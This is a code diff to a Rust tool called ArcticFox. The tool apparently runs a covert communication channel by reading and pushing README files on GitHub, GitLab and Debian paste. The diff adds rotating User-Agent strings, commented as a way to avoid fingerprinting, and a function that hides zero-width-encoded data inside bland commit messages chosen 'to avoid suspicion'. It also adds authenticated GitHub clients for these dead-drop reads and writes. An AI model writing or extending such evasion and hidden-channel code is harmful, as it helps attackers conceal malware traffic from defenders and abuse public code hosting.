@@ -7,7 +7,7 @@ use rand::Rng;
 use reqwest::{Client, StatusCode};
 use serde_json::Value;
 use std::time::Duration;
-use tracing::{debug, info, warn};
+use tracing::{debug, info};
 
 use crate::config::{ControlConfig, RepoTarget};
 use crate::error::{ArcticFoxError, Result};
@@ -15,12 +15,24 @@ use crate::zwcodec;
 
 // ── Constants ───────────────────────────────────────────────────────────────
 
-const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+/// Randomized User-Agent pool for HTTP clients — rotates to avoid static fingerprinting.
+pub fn random_user_agent() -> &'static str {
+    const UAS: &[&str] = &[
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    ];
+    UAS[rand::thread_rng().gen_range(0..UAS.len())]
+}
 const REQUEST_TIMEOUT: Duration = Duration::from_secs(30);
 const FETCH_TIMEOUT: Duration = Duration::from_secs(15);
 const MAX_FETCH_SIZE: usize = 2 * 1024 * 1024; // 2 MB
 
 /// Bland commit messages to avoid suspicion.
+/// ZW-encoded data can be appended invisibly using `zw_commit_msg()`.
 const BLAND_COMMITS: &[&str] = &[
     "Update README.md",
     "docs: update readme",
@@ -32,16 +44,51 @@ const BLAND_COMMITS: &[&str] = &[
     "update project description",
 ];
 
+/// Build a commit message with optional ZW-encoded data invisibly appended.
+/// The visible part is a bland message; ZW chars carry hidden data.
+pub fn zw_commit_msg(hidden_data: Option<&[u8]>) -> String {
+    let mut msg = BLAND_COMMITS[rand::thread_rng().gen_range(0..BLAND_COMMITS.len())].to_string();
+    if let Some(data) = hidden_data {
+        msg.push_str(&crate::zwcodec::encode(data));
+    }
+    msg
+}
+
 // ── HTTP Client ─────────────────────────────────────────────────────────────
 
 /// Build a reqwest Client with sensible defaults.
 pub fn build_client() -> Result<Client> {
     Client::builder()
-        .user_agent(USER_AGENT)
+        .user_agent(random_user_agent())
         .timeout(REQUEST_TIMEOUT)
         .tcp_nodelay(true)
         .pool_idle_timeout(Duration::from_secs(90))
         .pool_max_idle_per_host(5)
+        .build()
+        .map_err(|e| ArcticFoxError::Internal {
+            message: format!("Failed to build HTTP client: {e}"),
+        })
+}
+
+/// Build an HTTP client with a GitHub token for authenticated API access.
+pub fn build_client_with_token(token: &str) -> Result<Client> {
+    use reqwest::header;
+    let mut headers = header::HeaderMap::new();
+    let auth_value = format!("Bearer {}", token);
+    let mut auth_header = header::HeaderValue::from_str(&auth_value)
+        .map_err(|_| ArcticFoxError::Internal {
+            message: "Invalid GitHub token format".into(),
+        })?;
+    auth_header.set_sensitive(true);
+    headers.insert(header::AUTHORIZATION, auth_header);
+
+    Client::builder()
+        .user_agent(random_user_agent())
+        .timeout(REQUEST_TIMEOUT)
+        .tcp_nodelay(true)
+        .pool_idle_timeout(Duration::from_secs(90))
+        .pool_max_idle_per_host(5)
+        .default_headers(headers)
         .build()
         .map_err(|e| ArcticFoxError::Internal {
             message: format!("Failed to build HTTP client: {e}"),
@@ -54,6 +101,10 @@ pub fn build_client() -> Result<Client> {
 pub async fn check_repo_alive(repo: &RepoTarget, client: &Client) -> bool {
     let url = match repo.platform.as_str() {
         "debian" => format!("https://paste.debian.net/plain/{}", repo.repo),
+        "github" => format!(
+            "https://api.github.com/repos/{}/{}/contents/{}",
+            repo.owner, repo.repo, repo.file_path
+        ),
         _ => repo.raw_url(),
     };
 
@@ -95,7 +146,7 @@ async fn github_fetch_readme(
 
     let resp = client
         .get(&url)
-        .header("Authorization", format!("token {}", token))
+        .header("Authorization", format!("Bearer {}", token))
         .header("Accept", "application/vnd.github.v3+json")
         .timeout(FETCH_TIMEOUT)
         .send()
@@ -130,7 +181,7 @@ async fn github_fetch_readme(
     let content = String::from_utf8(
         base64::Engine::decode(
             &base64::engine::general_purpose::STANDARD,
-            content_b64,
+            content_b64.trim().replace('\n', "").replace('\r', ""),
         )
         .map_err(|e| ArcticFoxError::Internal {
             message: format!("Base64 decode failed: {e}"),
@@ -306,7 +357,7 @@ async fn github_push_readme(
         repo.owner, repo.repo, repo.file_path
     );
 
-    let commit_msg = BLAND_COMMITS[rand::thread_rng().gen_range(0..BLAND_COMMITS.len())];
+    let commit_msg = zw_commit_msg(None);
 
     let encoded = base64::Engine::encode(
         &base64::engine::general_purpose::STANDARD,
@@ -325,7 +376,7 @@ async fn github_push_readme(
 
     let resp = client
         .put(&url)
-        .header("Authorization", format!("token {}", token))
+        .header("Authorization", format!("Bearer {}", token))
         .header("Accept", "application/vnd.github.v3+json")
         .json(&body)
         .send()
@@ -357,7 +408,7 @@ async fn gitlab_push_readme(
         project_id, file_path
     );
 
-    let commit_msg = BLAND_COMMITS[rand::thread_rng().gen_range(0..BLAND_COMMITS.len())];
+    let commit_msg = zw_commit_msg(None);
 
     let body = serde_json::json!({
         "branch": repo.branch,
